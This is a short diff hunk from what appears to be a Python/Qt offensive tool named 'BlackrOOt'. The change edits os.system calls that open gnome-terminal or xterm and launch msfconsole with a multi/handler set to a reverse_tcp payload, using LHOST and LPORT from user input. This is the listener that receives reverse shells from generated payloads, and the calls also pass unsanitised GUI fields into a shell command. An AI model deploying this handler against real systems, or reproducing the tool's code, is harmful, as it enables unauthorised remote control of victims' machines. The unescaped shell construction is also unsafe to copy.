@@ -350,9 +350,9 @@ try:
 							if runmetasploit == QMessageBox.Yes:
 								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
 								if terminal == 0:
-									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
 								elif terminal == 1:
-									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				###########################################################################################################################################################################################################################################################################################
